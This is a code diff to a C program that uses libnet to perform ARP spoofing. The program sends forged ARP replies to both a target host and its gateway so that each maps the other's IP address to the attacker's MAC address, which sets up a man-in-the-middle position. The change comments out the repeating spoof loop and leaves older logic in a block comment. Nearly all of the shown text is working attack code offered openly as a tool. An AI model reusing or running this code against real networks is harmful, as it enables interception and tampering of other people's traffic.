@@ -1,4 +1,6 @@
 #include "arp.h"
+int first = 0;
+
 int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_char* destIp,int op){
 	libnet_t *net_t = NULL;
 	static u_char padPtr[18];
@@ -48,22 +50,39 @@ void* arp_spoof(void *eloop_data,void* user_data){
 	log_printf(MSG_INFO,"start arp spoof to both gateway and target");
 	int p_tag_target;
 	int p_tag_gateway;
-	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+       p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+                                m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
+       p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+                                m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
+       if(p_tag_target == -1 || p_tag_gateway == -1){
+               log_printf(MSG_WARNING,"arp spoof fail");
+               return NULL;
+       }
+      // while(1){
+                p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
+                                m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
+                p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->GATEWAY_MAC,
+                                m_info->TARGET_IP,m_info->GATEWAY_IP,p_tag_gateway);
+        //       if(p_tag_target == -1 || p_tag_gateway == -1)break;
+        //       usleep(500000);
+       // }
+       log_printf(MSG_WARNING,"arp spoof fail,return");
+       return NULL;
+/*	if(!first){
+		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
 				m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
-	p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
 				m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
-	if(p_tag_target == -1 || p_tag_gateway == -1){
-		log_printf(MSG_WARNING,"arp spoof fail");
-		return NULL;
-	}
-	while(1){
+		if(p_tag_target == -1 || p_tag_gateway == -1){
+			//first = 0;
+		} else {
+			//first = 1;
+		}
+	} else {
 		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
 				m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
 		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->GATEWAY_MAC,
 				m_info->TARGET_IP,m_info->GATEWAY_IP,p_tag_gateway);
-		if(p_tag_target == -1 || p_tag_gateway == -1)break;
-		usleep(500000);
 	}
-	log_printf(MSG_WARNING,"arp spoof fail,return");
-	return NULL;
+*/
 }
